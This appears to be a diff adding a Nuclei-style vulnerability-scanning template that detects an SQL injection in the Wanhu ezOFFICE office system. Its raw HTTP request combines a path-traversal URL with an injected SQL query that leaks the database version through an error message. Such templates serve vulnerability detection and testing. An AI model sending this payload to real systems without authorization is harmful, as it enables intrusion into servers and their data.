@@ -1,0 +1,28 @@
+id: wanhu-ezOFFICE-checkSQL-sqli
+
+info:
+  name: 万户ezOFFICE checkSQL_httprequest 存在SQL注入漏洞
+  author: wanhu
+  severity: high
+  tags: sqli,ezOFFICE
+
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../modules/hrm/report/customize/checkSQL_httprequest.jsp HTTP/1.1
+        Host: 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        
+        selectSQL=select distinct convert(int,@@VERSION)&dbType=sqlserver&fromSQL=--from+sysobjects+&whereSQL=--
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ERROR'
+      - type: status
+        status: 
+          - 200
